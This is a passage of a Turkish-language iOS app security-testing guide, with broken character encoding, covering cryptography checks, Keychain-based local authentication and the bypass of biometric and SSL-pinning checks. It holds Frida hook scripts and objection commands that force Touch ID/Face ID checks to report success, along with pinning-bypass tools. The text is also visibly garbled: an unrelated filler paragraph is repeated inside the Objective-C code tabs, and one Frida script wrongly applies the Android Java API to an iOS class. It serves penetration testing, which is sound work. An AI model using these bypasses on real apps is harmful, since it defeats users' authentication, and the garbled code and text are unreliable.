BazÄ± geliÅŸtiriciler, hassas verileri yerel depolamada saklar ve kodda sabit/predictable bir anahtarla ÅŸifreler. Bu, bazÄ± tersine mÃ¼hendislik iÅŸlemleriyle saldÄ±rganlarÄ±n gizli bilgileri Ã§Ä±karmasÄ±na izin vermemek iÃ§in yapÄ±lmamalÄ±dÄ±r.

### GÃ¼vensiz ve/veya KullanÄ±mdan KalkmÄ±ÅŸ AlgoritmalarÄ±n KullanÄ±mÄ±

GeliÅŸtiriciler, yetkilendirme kontrolÃ¼ yapmak, veri depolamak veya gÃ¶ndermek iÃ§in **kullanÄ±mdan kalkmÄ±ÅŸ algoritmalarÄ±** kullanmamalÄ±dÄ±r. Bu algoritmalar arasÄ±nda RC4, MD4, MD5, SHA1 gibi algoritmalar bulunur. Ã–rneÄŸin, ÅŸifreleri depolamak iÃ§in **hash** kullanÄ±lÄ±yorsa, tuz ile birlikte brute-force **dayanÄ±klÄ±** hash'ler kullanÄ±lmalÄ±dÄ±r.

### Kontrol

Kod iÃ§inde **sabit** ÅŸifreler/parolalar veya bunlarÄ±n **tahmin edilebilir** olup olmadÄ±ÄŸÄ±nÄ± bulmak ve kodun zayÄ±f ÅŸifreleme algoritmalarÄ± kullanÄ±p kullanmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in yapÄ±lmasÄ± gereken temel kontrollerdir.

Ä°lginÃ§ bir ÅŸekilde, **objection** kullanarak bazÄ± **ÅŸifreleme** **kÃ¼tÃ¼phanelerini** otomatik olarak izleyebilirsiniz. Bunun iÃ§in ÅŸu komutu kullanabilirsiniz:
```swift
ios monitor crypt
```
Daha fazla bilgi iÃ§in iOS kriptografik API'larÄ± ve kÃ¼tÃ¼phaneleri hakkÄ±nda [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography) adresine eriÅŸin.

## Yerel Kimlik DoÄŸrulama

**Yerel kimlik doÄŸrulama**, Ã¶zellikle ÅŸifreleme yÃ¶ntemleri aracÄ±lÄ±ÄŸÄ±yla uzaktan bir uÃ§ noktaya eriÅŸimi koruma konusunda Ã¶nemli bir rol oynar. Buradaki temel nokta, uygun bir ÅŸekilde uygulanmadÄ±ÄŸÄ±nda yerel kimlik doÄŸrulama mekanizmalarÄ±nÄ±n atlatÄ±labileceÄŸidir.

Apple'Ä±n **[Yerel Kimlik DoÄŸrulama Ã§erÃ§evesi](https://developer.apple.com/documentation/localauthentication)** ve **[anahtarlÄ±k](https://developer.apple.com/library/content/documentation/Security/Conceptual/keychainServConcepts/01introduction/introduction.html)**, geliÅŸtiricilere kullanÄ±cÄ± kimlik doÄŸrulama iletiÅŸim kutularÄ±nÄ± kolaylaÅŸtÄ±rmak ve gizli verileri gÃ¼venli bir ÅŸekilde iÅŸlemek iÃ§in saÄŸlam API'lar saÄŸlar. GÃ¼venli Enclave, Parmak Ä°zi KimliÄŸi iÃ§in parmak izini gÃ¼vence altÄ±na alÄ±rken, YÃ¼z KimliÄŸi biyometrik verileri tehlikeye atmadan yÃ¼z tanÄ±ma temelinde Ã§alÄ±ÅŸÄ±r.

Touch ID/Face ID'yi entegre etmek iÃ§in geliÅŸtiricilerin iki API seÃ§eneÄŸi vardÄ±r:
- YÃ¼ksek seviyeli kullanÄ±cÄ± kimlik doÄŸrulama iÃ§in **`LocalAuthentication.framework`**.
- DÃ¼ÅŸÃ¼k seviyeli anahtarlÄ±k hizmetlerine eriÅŸim iÃ§in **`Security.framework`**, biyometrik kimlik doÄŸrulama ile gizli verileri gÃ¼vence altÄ±na alÄ±r. [AÃ§Ä±k kaynaklÄ± sargÄ±lar](https://www.raywenderlich.com/147308/secure-ios-user-data-keychain-touch-id) anahtarlÄ±k eriÅŸimini daha basit hale getirir.

{% hint style="danger" %}
Ancak, hem `LocalAuthentication.framework` hem de `Security.framework` gÃ¼venlik aÃ§Ä±klarÄ± sunar, Ã§Ã¼nkÃ¼ Ã¶ncelikle kimlik doÄŸrulama sÃ¼reÃ§leri iÃ§in veri iletimi yapmadan boolean deÄŸerler dÃ¶ndÃ¼rÃ¼rler, bu da atlatÄ±labilirliklerine neden olur (bkz. [Don't touch me that way, by David Lindner et al](https://www.youtube.com/watch?v=XhXIHVGCFFM)).
{% endhint %}

### Yerel Kimlik DoÄŸrulama Uygulama

KullanÄ±cÄ±larÄ± kimlik doÄŸrulamasÄ± iÃ§in geliÅŸtiricilerin **`LAContext`** sÄ±nÄ±fÄ± iÃ§indeki **`evaluatePolicy`** yÃ¶ntemini kullanmalarÄ± gerekmektedir. AÅŸaÄŸÄ±daki seÃ§enekler arasÄ±ndan seÃ§im yapabilirler:
- **`deviceOwnerAuthentication`**: Touch ID veya cihaz ÅŸifresi iÃ§in istekte bulunur, ikisi de etkinleÅŸtirilmediyse baÅŸarÄ±sÄ±z olur.
- **`deviceOwnerAuthenticationWithBiometrics`**: Sadece Touch ID iÃ§in istekte bulunur.

BaÅŸarÄ±lÄ± bir kimlik doÄŸrulama, **`evaluatePolicy`** yÃ¶nteminden dÃ¶nen boolean bir deÄŸerle gÃ¶sterilir ve potansiyel bir gÃ¼venlik aÃ§Ä±ÄŸÄ±na iÅŸaret eder.

### AnahtarlÄ±k Kullanarak Yerel Kimlik DoÄŸrulama

iOS uygulamalarÄ±nda **yerel kimlik doÄŸrulama** uygulamak, kimlik doÄŸrulama belirteÃ§leri gibi gizli verileri gÃ¼venli bir ÅŸekilde depolamak iÃ§in **anahtarlÄ±k API'larÄ±nÄ±n** kullanÄ±lmasÄ±nÄ± iÃ§erir. Bu iÅŸlem, verinin yalnÄ±zca kullanÄ±cÄ± tarafÄ±ndan, cihaz ÅŸifresi veya Touch ID gibi biyometrik kimlik doÄŸrulama kullanÄ±larak eriÅŸilebileceÄŸini saÄŸlar.

AnahtarlÄ±k, `SecAccessControl` Ã¶zniteliÄŸiyle Ã¶ÄŸeleri ayarlamak iÃ§in yetenek sunar, bu da Ã¶ÄŸeye eriÅŸimi, kullanÄ±cÄ±nÄ±n Touch ID veya cihaz ÅŸifresiyle baÅŸarÄ±lÄ± bir ÅŸekilde kimlik doÄŸrulamasÄ±nÄ± gerektirir. Bu Ã¶zellik gÃ¼venliÄŸi artÄ±rmak iÃ§in Ã¶nemlidir.

AÅŸaÄŸÄ±da, bu gÃ¼venlik Ã¶zelliklerinden yararlanarak anahtarlÄ±ÄŸa bir dizeyi kaydetme ve geri almayÄ± gÃ¶steren Swift ve Objective-C kod Ã¶rnekleri bulunmaktadÄ±r. Ã–rnekler, eriÅŸim kontrolÃ¼nÃ¼ Touch ID kimlik doÄŸrulamasÄ±nÄ± gerektirecek ÅŸekilde ayarlama ve verinin yalnÄ±zca ayarlandÄ±ÄŸÄ± cihazda eriÅŸilebilir olmasÄ±nÄ± saÄŸlama konusunda Ã¶zellikle gÃ¶stermektedir.

{% tabs %}
{% tab title="Swift" %}
```swift
// From https://github.com/mufambisi/owasp-mstg/blob/master/Document/0x06f-Testing-Local-Authentication.md

// 1. create AccessControl object that will represent authentication settings

var error: Unmanaged<CFError>?

guard let accessControl = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
SecAccessControlCreateFlags.biometryCurrentSet,
&error) else {
// failed to create AccessControl object

return
}

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute

var query: [String: Any] = [:]

query[kSecClass as String] = kSecClassGenericPassword
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecAttrAccount as String] = "OWASP Account" as CFString
query[kSecValueData as String] = "test_strong_password".data(using: .utf8)! as CFData
query[kSecAttrAccessControl as String] = accessControl

// 3. save item

let status = SecItemAdd(query as CFDictionary, nil)

if status == noErr {
// successfully saved
} else {
// error while saving
}
```
{% tab title="Objective-C" %}

Objective-C dili, iOS uygulamalarÄ± geliÅŸtirmek iÃ§in kullanÄ±lan bir programlama dilidir. Bu dil, Apple'Ä±n Cocoa ve Cocoa Touch Ã§erÃ§evelerini kullanarak iOS platformunda Ã§alÄ±ÅŸan uygulamalar oluÅŸturmak iÃ§in kullanÄ±lÄ±r.

Objective-C dilinde iOS uygulamalarÄ±nÄ± hacklemek iÃ§in Ã§eÅŸitli teknikler bulunmaktadÄ±r. Bu teknikler arasÄ±nda uygulama analizi, tersine mÃ¼hendislik, bellek analizi ve gÃ¼venlik aÃ§Ä±klarÄ±nÄ±n keÅŸfi bulunur.

Uygulama analizi, iOS uygulamasÄ±nÄ±n Ã§alÄ±ÅŸma mantÄ±ÄŸÄ±nÄ± anlamak iÃ§in kullanÄ±lan bir tekniktir. Bu teknik, uygulamanÄ±n kaynak kodunu incelemek, API Ã§aÄŸrÄ±larÄ±nÄ± izlemek ve uygulamanÄ±n davranÄ±ÅŸÄ±nÄ± anlamak iÃ§in kullanÄ±lÄ±r.

Tersine mÃ¼hendislik, iOS uygulamasÄ±nÄ±n Ã§alÄ±ÅŸma prensibini anlamak iÃ§in kullanÄ±lan bir tekniktir. Bu teknik, uygulamanÄ±n derlenmiÅŸ kodunu analiz etmek, iÅŸlevlerini ve veri yapÄ±larÄ±nÄ± anlamak iÃ§in kullanÄ±lÄ±r.

Bellek analizi, iOS uygulamasÄ±nÄ±n bellek kullanÄ±mÄ±nÄ± incelemek iÃ§in kullanÄ±lan bir tekniktir. Bu teknik, uygulamanÄ±n bellek alanlarÄ±nÄ± izlemek, bellek sÄ±zÄ±ntÄ±larÄ±nÄ± tespit etmek ve gÃ¼venlik aÃ§Ä±klarÄ±nÄ± keÅŸfetmek iÃ§in kullanÄ±lÄ±r.

GÃ¼venlik aÃ§Ä±klarÄ±nÄ±n keÅŸfi, iOS uygulamasÄ±nda bulunan gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmek iÃ§in kullanÄ±lan bir tekniktir. Bu teknik, uygulamanÄ±n zayÄ±f noktalarÄ±nÄ± tespit etmek, yetkilendirme hatalarÄ±nÄ± bulmak ve veri sÄ±zÄ±ntÄ±larÄ±nÄ± keÅŸfetmek iÃ§in kullanÄ±lÄ±r.

Objective-C dilini kullanarak iOS uygulamalarÄ±nÄ± hacklemek iÃ§in bu teknikleri kullanabilirsiniz. Ancak, bu teknikleri yasal ve etik sÄ±nÄ±rlar iÃ§inde kullanmanÄ±z Ã¶nemlidir.
```objectivec
// 1. create AccessControl object that will represent authentication settings
CFErrorRef *err = nil;

SecAccessControlRef sacRef = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
kSecAccessControlUserPresence,
err);

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute
NSDictionary* query = @{
(_ _bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecAttrAccount: @"OWASP Account",
(__bridge id)kSecValueData: [@"test_strong_password" dataUsingEncoding:NSUTF8StringEncoding],
(__bridge id)kSecAttrAccessControl: (__bridge_transfer id)sacRef
};

// 3. save item
OSStatus status = SecItemAdd((__bridge CFDictionaryRef)query, nil);

if (status == noErr) {
// successfully saved
} else {
// error while saving
}
```
{% endtab %}
{% endtabs %}

Åimdi anahtar zincirinden kaydedilen Ã¶ÄŸeyi isteyebiliriz. Anahtar zinciri hizmetleri, kullanÄ±cÄ±ya kimlik doÄŸrulama iletiÅŸim kutusunu sunacak ve uygun bir parmak izi saÄŸlanÄ±p saÄŸlanmadÄ±ÄŸÄ±na baÄŸlÄ± olarak veri veya nil dÃ¶ndÃ¼recektir.

{% tabs %}
{% tab title="Swift" %}
```swift
// 1. define query
var query = [String: Any]()
query[kSecClass as String] = kSecClassGenericPassword
query[kSecReturnData as String] = kCFBooleanTrue
query[kSecAttrAccount as String] = "My Name" as CFString
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecUseOperationPrompt as String] = "Please, pass authorisation to enter this area" as CFString

// 2. get item
var queryResult: AnyObject?
let status = withUnsafeMutablePointer(to: &queryResult) {
SecItemCopyMatching(query as CFDictionary, UnsafeMutablePointer($0))
}

if status == noErr {
let password = String(data: queryResult as! Data, encoding: .utf8)!
// successfully received password
} else {
// authorization not passed
}
```
{% tab title="Objective-C" %}

Objective-C dili, iOS uygulamalarÄ± geliÅŸtirmek iÃ§in kullanÄ±lan bir programlama dilidir. Bu dil, Apple'Ä±n Cocoa ve Cocoa Touch Ã§erÃ§evelerini kullanarak iOS platformunda Ã§alÄ±ÅŸan uygulamalar oluÅŸturmak iÃ§in kullanÄ±lÄ±r.

Objective-C dilinde iOS uygulamalarÄ±nÄ± hacklemek iÃ§in Ã§eÅŸitli teknikler bulunmaktadÄ±r. Bu teknikler arasÄ±nda uygulama analizi, tersine mÃ¼hendislik, bellek analizi ve gÃ¼venlik aÃ§Ä±klarÄ±nÄ±n keÅŸfi bulunur.

Uygulama analizi, iOS uygulamasÄ±nÄ±n Ã§alÄ±ÅŸma mantÄ±ÄŸÄ±nÄ± anlamak iÃ§in kullanÄ±lan bir tekniktir. Bu teknik, uygulamanÄ±n kaynak kodunu incelemek, API Ã§aÄŸrÄ±larÄ±nÄ± izlemek ve uygulamanÄ±n davranÄ±ÅŸÄ±nÄ± anlamak iÃ§in kullanÄ±lÄ±r.

Tersine mÃ¼hendislik, iOS uygulamasÄ±nÄ±n Ã§alÄ±ÅŸma prensibini anlamak iÃ§in kullanÄ±lan bir tekniktir. Bu teknik, uygulamanÄ±n derlenmiÅŸ kodunu analiz etmek, iÅŸlevlerini ve veri yapÄ±larÄ±nÄ± anlamak iÃ§in kullanÄ±lÄ±r.

Bellek analizi, iOS uygulamasÄ±nÄ±n bellek kullanÄ±mÄ±nÄ± incelemek iÃ§in kullanÄ±lan bir tekniktir. Bu teknik, uygulamanÄ±n bellek alanlarÄ±nÄ± izlemek, bellek sÄ±zÄ±ntÄ±larÄ±nÄ± tespit etmek ve gÃ¼venlik aÃ§Ä±klarÄ±nÄ± keÅŸfetmek iÃ§in kullanÄ±lÄ±r.

GÃ¼venlik aÃ§Ä±klarÄ±nÄ±n keÅŸfi, iOS uygulamasÄ±nda bulunan gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmek iÃ§in kullanÄ±lan bir tekniktir. Bu teknik, uygulamanÄ±n zayÄ±f noktalarÄ±nÄ± tespit etmek, yetkilendirme hatalarÄ±nÄ± bulmak ve veri sÄ±zÄ±ntÄ±larÄ±nÄ± keÅŸfetmek iÃ§in kullanÄ±lÄ±r.

Objective-C dilini kullanarak iOS uygulamalarÄ±nÄ± hacklemek iÃ§in bu teknikleri kullanabilirsiniz. Ancak, bu teknikleri yasal ve etik sÄ±nÄ±rlar iÃ§inde kullanmanÄ±z Ã¶nemlidir.
```objectivec
// 1. define query
NSDictionary *query = @{(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecAttrAccount: @"My Name1",
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecUseOperationPrompt: @"Please, pass authorisation to enter this area" };

// 2. get item
CFTypeRef queryResult = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, &queryResult);

if (status == noErr){
NSData* resultData = ( __bridge_transfer NSData* )queryResult;
NSString* password = [[NSString alloc] initWithData:resultData encoding:NSUTF8StringEncoding];
NSLog(@"%@", password);
} else {
NSLog(@"Something went wrong");
}
```
{% endtab %}
{% endtabs %}

### Tespit

Bir uygulamada kullanÄ±lan Ã§erÃ§eveler, uygulama ikili dosyasÄ±nÄ±n paylaÅŸÄ±lan dinamik kÃ¼tÃ¼phaneler listesini analiz ederek tespit edilebilir. Bunun iÃ§in `otool` kullanÄ±labilir:
```bash
$ otool -L <AppName>.app/<AppName>
```
EÄŸer bir uygulamada `LocalAuthentication.framework` kullanÄ±lÄ±yorsa, Ã§Ä±ktÄ± aÅŸaÄŸÄ±daki iki satÄ±rÄ± iÃ§erecektir (unutmayÄ±n ki `LocalAuthentication.framework`, arka planda `Security.framework` kullanÄ±r):

```plaintext
- Security.framework
- LocalAuthentication.framework
```

EÄŸer bir uygulama `LocalAuthentication.framework` kullanmÄ±yorsa, Ã§Ä±ktÄ± sadece `Security.framework` satÄ±rÄ±nÄ± iÃ§erecektir.
```bash
/System/Library/Frameworks/LocalAuthentication.framework/LocalAuthentication
/System/Library/Frameworks/Security.framework/Security
```
EÄŸer `Security.framework` kullanÄ±lÄ±yorsa, sadece ikinci olan gÃ¶sterilecektir.

### Yerel Kimlik DoÄŸrulama Ã‡erÃ§evesi Atlama

#### **Objection**

**Objection Biometrics Bypass** Ã¼zerinden, [bu GitHub sayfasÄ±nda](https://github.com/sensepost/objection/wiki/Understanding-the-iOS-Biometrics-Bypass) yer alan bir teknik, **LocalAuthentication** mekanizmasÄ±nÄ± aÅŸmak iÃ§in kullanÄ±labilir. Bu yaklaÅŸÄ±mÄ±n temelinde, `evaluatePolicy` fonksiyonunu manipÃ¼le etmek iÃ§in **Frida**'nÄ±n kullanÄ±lmasÄ± yer alÄ±r ve bu sayede gerÃ§ek kimlik doÄŸrulama baÅŸarÄ±sÄ±ndan baÄŸÄ±msÄ±z olarak sÃ¼rekli olarak `True` sonucu elde edilir. Bu, hatalÄ± biyometrik kimlik doÄŸrulama sÃ¼reÃ§lerini atlamak iÃ§in oldukÃ§a kullanÄ±ÅŸlÄ±dÄ±r.

Bu atlama iÅŸlemini etkinleÅŸtirmek iÃ§in aÅŸaÄŸÄ±daki komut kullanÄ±lÄ±r:
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios ui biometrics_bypass
(agent) Registering job 3mhtws9x47q. Type: ios-biometrics-disable
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # (agent) [3mhtws9x47q] Localized Reason for auth requirement: Please authenticate yourself
(agent) [3mhtws9x47q] OS authentication response: false
(agent) [3mhtws9x47q] Marking OS response as True instead
(agent) [3mhtws9x47q] Biometrics bypass hook complete
```
Bu komut, Objection'Ä±n `evaluatePolicy` kontrolÃ¼nÃ¼n sonucunu etkili bir ÅŸekilde `True` olarak deÄŸiÅŸtiren bir gÃ¶rev kaydeder.

#### Frida

[DVIA-v2 uygulamasÄ±](https://github.com/prateek147/DVIA-v2)ndan bir **`evaluatePolicy`** kullanÄ±mÄ± Ã¶rneÄŸi:
```swift
+(void)authenticateWithTouchID {
LAContext *myContext = [[LAContext alloc] init];
NSError *authError = nil;
NSString *myLocalizedReasonString = @"Please authenticate yourself";

if ([myContext canEvaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics error:&authError]) {
[myContext evaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics
localizedReason:myLocalizedReasonString
reply:^(BOOL success, NSError *error) {
if (success) {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Successful" withTitle:@"Success"];
});
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Failed !" withTitle:@"Error"];
});
}
}];
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Your device doesn't support Touch ID or you haven't configured Touch ID authentication on your device" withTitle:@"Error"];
});
}
}
```
**Bypass** iÅŸlemini gerÃ§ekleÅŸtirmek iÃ§in, bir Frida betiÄŸi yazÄ±lÄ±r. Bu betik, **evaluatePolicy** kontrolÃ¼nÃ¼ hedef alÄ±r ve geri Ã§aÄŸÄ±rÄ±mÄ±nÄ± deÄŸiÅŸtirerek her zaman **success=1** dÃ¶ndÃ¼rÃ¼lmesini saÄŸlar. Geri Ã§aÄŸÄ±rÄ±mÄ±n davranÄ±ÅŸÄ±nÄ± deÄŸiÅŸtirerek, kimlik doÄŸrulama kontrolÃ¼ etkili bir ÅŸekilde atlatÄ±lÄ±r.

AÅŸaÄŸÄ±daki betik, **evaluatePolicy** yÃ¶nteminin sonucunu deÄŸiÅŸtirmek iÃ§in enjekte edilir. Geri Ã§aÄŸÄ±rÄ±mÄ±n sonucunu her zaman baÅŸarÄ± olarak gÃ¶sterir.

```javascript
// Frida script to bypass Local Authentication
Java.perform(function() {
    var LAContext = Java.use('LocalAuthentication.LAContext');
    LAContext.evaluatePolicy_withReply_implementation.implementation = function(policy, reply) {
        reply(1, null);
    };
});
```
```swift
// from https://securitycafe.ro/2022/09/05/mobile-pentesting-101-bypassing-biometric-authentication/
if(ObjC.available) {
console.log("Injecting...");
var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
Interceptor.attach(hook.implementation, {
onEnter: function(args) {
var block = new ObjC.Block(args[4]);
const callback = block.implementation;
block.implementation = function (error, value)  {

console.log("Changing the result value to true")
const result = callback(1, null);
return result;
};
},
});
} else {
console.log("Objective-C Runtime is not available!");
}
```
Frida betiÄŸi enjekte etmek ve biyometrik kimlik doÄŸrulamayÄ± atlamak iÃ§in aÅŸaÄŸÄ±daki komut kullanÄ±lÄ±r:
```bash
frida -U -f com.highaltitudehacks.DVIAswiftv2 --no-pause -l fingerprint-bypass-ios.js
```
## IPC AracÄ±lÄ±ÄŸÄ±yla Hassas Ä°ÅŸlevlerin AÃ§Ä±ÄŸa Ã‡Ä±karÄ±lmasÄ±

### Ã–zel URI Ä°ÅŸleyicileri / Derin BaÄŸlantÄ±lar / Ã–zel Åemalar

{% content-ref url="ios-custom-uri-handlers-deeplinks-custom-schemes.md" %}
[ios-custom-uri-handlers-deeplinks-custom-schemes.md](ios-custom-uri-handlers-deeplinks-custom-schemes.md)
{% endcontent-ref %}

### Evrensel BaÄŸlantÄ±lar

{% content-ref url="ios-universal-links.md" %}
[ios-universal-links.md](ios-universal-links.md)
{% endcontent-ref %}

### UIActivity PaylaÅŸÄ±mÄ±

{% content-ref url="ios-uiactivity-sharing.md" %}
[ios-uiactivity-sharing.md](ios-uiactivity-sharing.md)
{% endcontent-ref %}

### UIPasteboard

{% content-ref url="ios-uipasteboard.md" %}
[ios-uipasteboard.md](ios-uipasteboard.md)
{% endcontent-ref %}

### Uygulama UzantÄ±larÄ±

{% content-ref url="ios-app-extensions.md" %}
[ios-app-extensions.md](ios-app-extensions.md)
{% endcontent-ref %}

### Web GÃ¶rÃ¼nÃ¼mleri

{% content-ref url="ios-webviews.md" %}
[ios-webviews.md](ios-webviews.md)
{% endcontent-ref %}

### SerileÅŸtirme ve Kodlama

{% content-ref url="ios-serialisation-and-encoding.md" %}
[ios-serialisation-and-encoding.md](ios-serialisation-and-encoding.md)
{% endcontent-ref %}

## AÄŸ Ä°letiÅŸimi

**Åifreleme olmadan** gerÃ§ekleÅŸen iletiÅŸimin olmadÄ±ÄŸÄ±nÄ± ve uygulamanÄ±n sunucunun **TLS sertifikasÄ±nÄ± doÄŸru bir ÅŸekilde doÄŸruladÄ±ÄŸÄ±nÄ±** kontrol etmek Ã¶nemlidir.\
Bu tÃ¼r sorunlarÄ± kontrol etmek iÃ§in **Burp** gibi bir proxy kullanabilirsiniz:

{% content-ref url="burp-configuration-for-ios.md" %}
[burp-configuration-for-ios.md](burp-configuration-for-ios.md)
{% endcontent-ref %}

### Ana bilgisayar adÄ± kontrolÃ¼

TLS sertifikasÄ±nÄ± doÄŸrularken yaygÄ±n bir sorun, sertifikasÄ±nÄ±n **gÃ¼venilir bir CA tarafÄ±ndan imzalandÄ±ÄŸÄ±nÄ±** kontrol etmek, ancak sertifikasÄ±nÄ±n eriÅŸilen ana bilgisayar adÄ± olup olmadÄ±ÄŸÄ±nÄ± **kontrol etmemektir**.\
Bu sorunu Burp kullanarak kontrol etmek iÃ§in, iPhone'da Burp CA'ya gÃ¼ven verdikten sonra, **farklÄ± bir ana bilgisayar adÄ± iÃ§in Burp ile yeni bir sertifika oluÅŸturabilir** ve bunu kullanabilirsiniz. Uygulama hala Ã§alÄ±ÅŸÄ±yorsa, bir ÅŸeyin savunmasÄ±z olduÄŸu anlamÄ±na gelir.

### Sertifika Pinleme

Bir uygulama SSL Pinning'i doÄŸru bir ÅŸekilde kullanÄ±yorsa, uygulama yalnÄ±zca beklenen sertifika olduÄŸunda Ã§alÄ±ÅŸÄ±r. Bir uygulamayÄ± test ederken, Burp kendi sertifikasÄ±nÄ± sunacaÄŸÄ±ndan bu bir sorun olabilir.\
Bu korumayÄ± bir jailbroken cihazda atlamak iÃ§in, [**SSL Kill Switch**](https://github.com/nabla-c0d3/ssl-kill-switch2) uygulamasÄ±nÄ± veya [**Burp Mobile Assistant**](https://portswigger.net/burp/documentation/desktop/mobile/config-ios-device) uygulamasÄ±nÄ± yÃ¼kleyebilirsiniz.

AyrÄ±ca **objection**'Ä±n `ios sslpinning disable` komutunu da kullanabilirsiniz.

## Ã‡eÅŸitli

* **`/System/Library`** dizininde, sistem uygulamalarÄ± tarafÄ±ndan kullanÄ±lan telefona yÃ¼klenen Ã§erÃ§eveleri bulabilirsiniz.
* KullanÄ±cÄ±nÄ±n App Store'dan yÃ¼klediÄŸi uygulamalar **`/User/Applications`** dizininde bulunur.
* Ve **`/User/Library`** kullanÄ±cÄ± dÃ¼zeyindeki uygulamalar tarafÄ±ndan kaydedilen verileri iÃ§erir.
* Uygulama iÃ§inde kaydedilen notlarÄ± okumak iÃ§in **`/User/Library/Notes/notes.sqlite`**'e eriÅŸebilirsiniz.
* YÃ¼klenen bir uygulamanÄ±n klasÃ¶rÃ¼ iÃ§inde (**`/User/Applications/<APP ID>/`**) bazÄ± ilginÃ§ dosyalar bulabilirsiniz:
* **`iTunesArtwork`**: Uygulama tarafÄ±ndan kullanÄ±lan simge
* **`iTunesMetadata.plist`**: App Store'da kullanÄ±lan uygulama bilgileri
* **`/Library/*`**: Tercihleri ve Ã¶nbelleÄŸi iÃ§erir. **`/Library/Cache/Snapshots/*`** iÃ§inde, uygulamanÄ±n arka planda gÃ¶nderilmeden Ã¶nce yapÄ±lan anlÄ±k gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ bulabilirsiniz.

### SÄ±cak Yama / Zorunlu GÃ¼ncelleme

GeliÅŸtiriciler, uygulamalarÄ±nÄ±n tÃ¼m kurulumlarÄ±nÄ± yeniden gÃ¶ndermek ve onaylanmasÄ±nÄ± beklemek zorunda kalmadan anÄ±nda **tÃ¼m kurulumlarÄ±nÄ± uzaktan dÃ¼zeltebilirler**.\
Bu amaÃ§la genellikle [**JSPatch**](https://github.com/bang590/JSPatch) kullanÄ±lÄ±r. Ancak [Siren](https://github.com/ArtSabintsev/Siren) ve [react-native-appstore-version-checker](https://www.npmjs.com/package/react-native-appstore-version-checker) gibi diÄŸer seÃ§enekler de vardÄ±r.\
**Bu, kÃ¶tÃ¼ niyetli Ã¼Ã§Ã¼ncÃ¼ taraf SDK'larÄ± tarafÄ±ndan kÃ¶tÃ¼ye kullanÄ±labilecek tehlikeli bir mekanizmadÄ±r, bu nedenle otomatik gÃ¼ncelleme iÃ§in hangi yÃ¶ntemin kullanÄ±ldÄ±ÄŸÄ±nÄ± kontrol etmeniz ve test etmeniz Ã¶nerilir.** Bu amaÃ§la uygulamanÄ±n Ã¶nceki bir sÃ¼rÃ¼mÃ¼nÃ¼ indirmeyi deneyebilirsiniz.

### ÃœÃ§Ã¼ncÃ¼ Taraf Hizmetleri

**3. taraf SDK'larÄ±** ile ilgili Ã¶nemli bir zorluk, bu SDK'larÄ±n iÅŸlevlerinin **ayrÄ±ntÄ±lÄ± kontrolÃ¼nÃ¼n eksikliÄŸi**dir. GeliÅŸtiriciler bir seÃ§imle karÅŸÄ± karÅŸÄ±yadÄ±r: SDK'yÄ± entegre etmek ve potansiyel gÃ¼venlik aÃ§Ä±klarÄ± ve gizlilik endiÅŸeleri de dahil olmak Ã¼zere tÃ¼m Ã¶zelliklerini kabul etmek veya tamamen faydalarÄ±ndan vazgeÃ§mek. Bu SDK'lar iÃ§indeki gÃ¼venlik aÃ§Ä±klarÄ±nÄ± kendileri yamalayamazlar. DahasÄ±, SDK'lar toplulukta gÃ¼ven kazandÄ±kÃ§a, bazÄ±larÄ± kÃ¶tÃ¼ amaÃ§lÄ± yazÄ±lÄ±m iÃ§erebilir.

ÃœÃ§Ã¼ncÃ¼ taraf SDK'larÄ±n saÄŸladÄ±ÄŸÄ± hizmetler, kullanÄ±cÄ± davranÄ±ÅŸ izleme, reklam gÃ¶sterimi veya kullanÄ±cÄ± deneyimi iyileÅŸtirmeleri gibi olabilir. Ancak bu, geliÅŸtiricilerin bu kÃ¼tÃ¼phaneler tarafÄ±ndan yÃ¼rÃ¼tÃ¼len kodun tam olarak farkÄ±nda olmamasÄ±na ve potansiyel gizlilik ve gÃ¼venlik risklerine yol aÃ§abilecek potansiyel risklere neden olur. ÃœÃ§Ã¼ncÃ¼ taraf hizmetlerle paylaÅŸÄ±lan bilgilerin, KiÅŸisel TanÄ±mlanabilir Bilgilerin (PII) ifÅŸa edilmesini Ã¶nlemek iÃ§in **anonimleÅŸtirilmesi** Ã¶nemlidir.

Bir uygulamanÄ±n kullandÄ±ÄŸÄ± kÃ¼tÃ¼phaneleri belirlemek iÃ§in **`otool`** komutu kullanÄ±labilir. Bu araÃ§, uygulama ve kullandÄ±ÄŸÄ± her paylaÅŸÄ±lan kÃ¼tÃ¼phane Ã¼zerinde Ã§alÄ±ÅŸtÄ±rÄ±lmalÄ± ve ek kÃ¼tÃ¼phaneler keÅŸfedilmelidir.
```bash
otool -L <application_path>
```
## **Referanslar ve Daha Fazla Kaynak**

